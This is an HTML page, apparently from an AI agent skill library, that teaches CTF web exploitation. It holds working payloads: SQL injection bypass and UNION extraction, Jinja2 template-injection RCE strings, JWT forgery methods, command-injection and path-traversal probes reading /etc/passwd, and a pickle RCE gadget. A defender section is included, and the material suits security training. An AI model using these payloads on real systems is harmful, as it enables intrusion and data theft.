@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ctf-web-challenges</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ctf-web-challenges</h2><div class="meta"><span class="badge gray">ctf</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when competing in a CTF web challenge, practicing in a</p><h2>Sub-skills</h2><ul><li><a href="ctf-web-challenges-jwt-challenges.html">ctf-web-challenges-jwt-challenges</a> <span class="muted">v1.0.0: Use when a CTF web challenge uses JSON Web Tokens for</span></li><li><a href="ctf-web-challenges-sqli-challenges.html">ctf-web-challenges-sqli-challenges</a> <span class="muted">v1.0.0: Use when a CTF web challenge involves SQL injection, whether</span></li><li><a href="ctf-web-challenges-ssti-challenges.html">ctf-web-challenges-ssti-challenges</a> <span class="muted">v1.0.0: Use when a CTF web challenge renders user input through a</span></li></ul><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="ctf-crypto-challenges.html">ctf-crypto-challenges</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>curl</td><td>8.5</td></tr><tr><td>sqlmap</td><td>1.9.2</td></tr><tr><td>Node.js</td><td>22.11</td></tr></tbody></table><p>Web challenges give you a URL (and often source code) and a flag hidden behind a vulnerability. The winning pattern is systematic: map the application, read every piece of client-side code and provided source, identify the vulnerability class, exploit it minimally to prove impact, then escalate to flag retrieval. This skill covers the authorized methodology across the most common CTF web bug classes, with concrete payloads and the order of operations that wastes the least time. Scope is CTF competitions, lab apps, and systems you have explicit permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Recon the app: visit every route, note forms, parameters, cookies,</li>
+<p>and JavaScript files; run a light directory scan for hidden paths.</p>
+<li>Read all provided source code first; CTF web challenges are usually</li>
+<p>solved from source, not black box.</p>
+<li>Read client-side JavaScript for API endpoints, hardcoded secrets, and</li>
+<p>commented-out routes.</p>
+<li>Classify the bug: SQLi, SSTI, JWT, command injection, LFI/RFI,</li>
+<p>deserialization, or logic flaw, based on source patterns.</p>
+<li>Reproduce locally if source is provided (docker compose up) so you</li>
+<p>can iterate fast without rate limits.</p>
+<li>Exploit minimally: prove the primitive (a sleep, a reflected value,</li>
+<p>a decoded token) before going for the flag.</p>
+<li>Escalate to flag retrieval: read <code>flag.txt</code>, dump the database, or</li>
+<p>achieve code execution as the challenge allows.</p>
+<li>Record the exact requests (Burp history or curl) so the writeup is</li>
+<p>reproducible.</p>
+</ol>
+<h2>1. Recon and source review</h2>
+<pre><code class="language-bash"># Fetch and inventory
+curl -s http://chals.ctf:8000/ | head -50
+curl -s http://chals.ctf:8000/robots.txt
+curl -s http://chals.ctf:8000/static/app.js | grep -n -i -E &quot;fetch|api|/admin|secret|token&quot; | head -20
+
+# Light directory scan (authorized scope only, low threads)
+# use your preferred wordlist; keep it quiet on shared CTF infra</code></pre>
+<p>Source review checklist (when source is given):</p>
+<ul>
+<li><code>app.py</code> / <code>index.js</code>: route handlers, especially ones reading files</li>
+<p>or building queries from request input.</p>
+<li>Template rendering: <code>render_template_string(</code> with user input is the</li>
+<p>SSTI signature.</p>
+<li>JWT code: look for <code>algorithms=[&quot;none&quot;]</code>, hardcoded secrets, or</li>
+<p><code>verify_signature=False</code>.</p>
+<li>Database calls: string-concatenated SQL is the SQLi signature.</li>
+<li><code>os.system</code>, <code>subprocess</code>, <code>eval</code>, <code>pickle.loads</code> on user input:</li>
+<p>command injection or deserialization.</p>
+<li>File reads: <code>open(os.path.join(base, request.args[&#x27;f&#x27;]))</code> is path</li>
+<p>traversal bait.</p>
+</ul>
+<h2>2. SQL injection in CTF web apps</h2>
+<p>CTF SQLi is usually login bypass or data extraction, often with the flag in the database.</p>
+<pre><code class="language-bash"># Login bypass probes (try in order)
+admin&#x27; --
+admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; --
+&#x27; OR 1=1 --
+admin&#x27; OR 1=1-- -
+
+# UNION extraction once a visible column is found
+&#x27; UNION SELECT 1,2,3-- -
+&#x27; UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -
+&#x27; UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=&#x27;flags&#x27;-- -
+&#x27; UNION SELECT 1,flag,3 FROM flags-- -</code></pre>
+<p>For blind cases, script boolean extraction in Python (see the web-sqli skill for the full loop). In CTFs, <code>sqlmap --batch -u &lt;url&gt;</code> with the captured request often finishes the job in seconds; save manual work for WAF-filtered cases.</p>
+<h2>3. Server-side template injection (SSTI)</h2>
+<p>If user input is rendered by a template engine, inject template syntax to reach code execution.</p>
+<pre><code class="language-bash"># Detection: does the app evaluate {{7*7}}?
+curl -s -X POST http://chals.ctf:8000/greet -d &#x27;name={{7*7}}&#x27;
+# response contains &quot;49&quot; -&gt; SSTI confirmed (Jinja2/Twig style)
+
+# Jinja2 (Python) exploitation ladder
+{{ self.__init__.__globals__.__builtins__ }}          # recon: what is reachable
+{{ cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}  # RCE via known subclasses
+{{ namespace.__init__.__globals__.os.popen(&#x27;cat /flag*&#x27;).read() }}</code></pre>
+<p>Full Jinja2 RCE payload (subclass traversal):</p>
+<pre><code>{{ &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read() }}</code></pre>
+<p>The subclass index varies per Python build; enumerate locally with the same Python version:</p>
+<pre><code class="language-python"># find a usable subclass index locally
+subs = &#x27;&#x27;.__class__.__mro__[1].__subclasses__()
+for i, c in enumerate(subs):
+    if &#x27;os&#x27; in getattr(getattr(c, &#x27;__init__&#x27;, None), &#x27;__globals__&#x27;, {}):
+        print(i, c)</code></pre>
+<p>Twig (PHP) variant: <code>{{_self.env.setCache(&quot;ftp://...&quot;)}}</code> style payloads differ; identify the engine from error messages or source first.</p>
+<h2>4. JWT weaknesses</h2>
+<p>CTF JWT challenges recycle a short list of misconfigurations.</p>
+<pre><code class="language-bash"># Decode without verifying (header.payload are base64url JSON)
+python3 -c &quot;
+import base64, json
+tok = &#x27;eyJhbGciOi...&#x27;.split(&#x27;.&#x27;)
+print(json.loads(base64.urlsafe_b64decode(tok[0] + &#x27;==&#x27;)))
+print(json.loads(base64.urlsafe_b64decode(tok[1] + &#x27;==&#x27;)))
+&quot;</code></pre>
+<p>Attack ladder:</p>
+<ol>
+<li><code>alg: none</code>: strip the signature, set <code>&quot;alg&quot;:&quot;none&quot;</code>, change</li>
+<p><code>&quot;role&quot;:&quot;admin&quot;</code>.</p>
+<li>Weak secret: brute force with a wordlist (<code>jwt_tool</code>, hashcat mode</li>
+<p>16500, or John); secrets like <code>secret</code>, <code>password</code>, <code>ctf</code> are common.</p>
+<li><code>kid</code> SQLi or path traversal: if <code>kid</code> selects the key from a DB or</li>
+<p>file, inject there.</p>
+<li>Algorithm confusion (RS256 -&gt; HS256): sign with the RSA public key</li>
+<p>as HMAC secret when the app mishandles key types.</p>
+<li><code>jwk</code>/<code>jku</code> header injection: embed your own key when the app trusts</li>
+<p>the token&#x27;s key parameters.</p>
+</ol>
+<pre><code class="language-bash"># jwt_tool quick checks (install from your tools dir)
+python3 jwt_tool.py &lt;token&gt; -C -d /usr/share/wordlists/rockyou.txt
+python3 jwt_tool.py &lt;token&gt; -X s -pk pubkey.pem   # alg confusion probe</code></pre>
+<h2>5. Command injection and file inclusion</h2>
+<pre><code class="language-bash"># Command injection probes (in order of subtlety)
+;id
+$(id)
+`id`
+|id
+&amp;&amp; id
+
+# If output is reflected, escalate:
+;cat /flag* /flag.txt /app/flag*
+
+# LFI probes
+../../../../etc/passwd
+....//....//....//etc/passwd
+/etc/passwd%00   # null byte (old PHP)
+/proc/self/environ (log poisoning path when logs are readable)</code></pre>
+<p>PHP wrappers when <code>allow_url_include</code> is on: <code>php://filter/convert.base64-encode/resource=index.php</code> reads source as base64. Python path traversal: <code>..%2f..%2f</code> encoding variants when a naive filter strips <code>../</code>.</p>
+<h2>6. Insecure deserialization (Python pickle / PHP / Node)</h2>
+<pre><code class="language-python"># Python pickle RCE gadget (when the app unpickles user input, e.g. a cookie)
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, (&quot;cat /flag.txt &gt; /tmp/o&quot;,))
+print(base64.b64encode(pickle.dumps(RCE())).decode())</code></pre>
+<p>Set the resulting base64 as the cookie value the app unpickles, then read <code>/tmp/o</code> through whatever file-read primitive exists (or use a reverse shell if egress is allowed by the challenge network). Node <code>node-serialize</code> and PHP <code>unserialize</code> have their own gadget chains; the pattern is identical: find the sink, craft the payload, trigger it.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The app is behind a WAF that blocks obvious payloads: encode</li>
+<p>(<code>${7*7}</code> vs <code>{{7*7}}</code> for SSTI), use alternative syntax, or find the filter in source and bypass it precisely.</p>
+<li>Rate limiting on login forms: slow the brute force, or the intended</li>
+<p>path is SQLi bypass, not credential guessing.</p>
+<li>Flag is not at <code>/flag.txt</code>: enumerate with <code>ls /</code>, `find / -name</li>
+<p>&quot;*flag*&quot;<code>, or check environment variables (</code>env`) and the database.</p>
+<li>The challenge resets per connection: do recon once, script the full</li>
+<p>exploit, and run it end to end in one go.</p>
+<li>Source shows a framework you do not know: search its docs for the</li>
+<p>dangerous defaults (template autoescape off, JWT verify off) rather than guessing payloads.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>SSTI gives output but no RCE: the sandbox may block attribute</li>
+<p>access; try alternative gadget paths (<code>cycler</code>, <code>joiner</code>, <code>namespace</code>) or read files via <code>__class__</code> loaders instead of <code>os</code>.</p>
+<li>SQLi is blind and slow: check for an easier bug first; CTF authors</li>
+<p>rarely intend a 10,000 request blind extraction when SSTI is also present.</p>
+<li>JWT secret brute force fails: move down the ladder (kid injection,</li>
+<p>jku) instead of burning hours on rockyou.</p>
+<li>RCE achieved but no flag file: the flag may be in an environment</li>
+<p>variable, a database, or a second container; enumerate from the shell.</p>
+<li>Everything looks patched: re-read the source for logic flaws</li>
+<p>(price manipulation, IDOR on <code>/user/&lt;id&gt;</code>, admin routes without checks); some web challenges are pure logic.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see web exploitation as payloads in access logs: <code>{{</code>, <code>${</code>, <code>UNION SELECT</code>, <code>../</code>, <code>${jndi:</code>, and base64 blobs in cookies, plus scanner-like bursts from one IP. A WAF blocks the noisy variants but misses encoded ones, so defenders also monitor for the outcomes: new processes spawned by the web user, unexpected file reads (<code>/flag*</code>, <code>/etc/passwd</code>), and database query anomalies. Durable fixes: parameterized queries, template autoescape with no user input in template strings, strict JWT validation (explicit allowlisted algorithms, strong secrets), and never passing user input to shells or deserializers.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-89 (SQL Injection), CWE-94 (Code Injection), CWE-918-adjacent</li>
+<p>template injection patterns, CWE-22 (Path Traversal).</p>
+<li>CWE-287 (Improper Authentication): JWT validation failures.</li>
+<li>CWE-502 (Deserialization of Untrusted Data).</li>
+<li>PortSwigger Web Security Academy: https://portswigger.net/web-security</li>
+<li>OWASP Testing Guide v4: https://owasp.org/www-project-web-security-testing-guide/</li>
+<li>HackTricks web section: https://book.hacktricks.xyz/pentesting-web</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
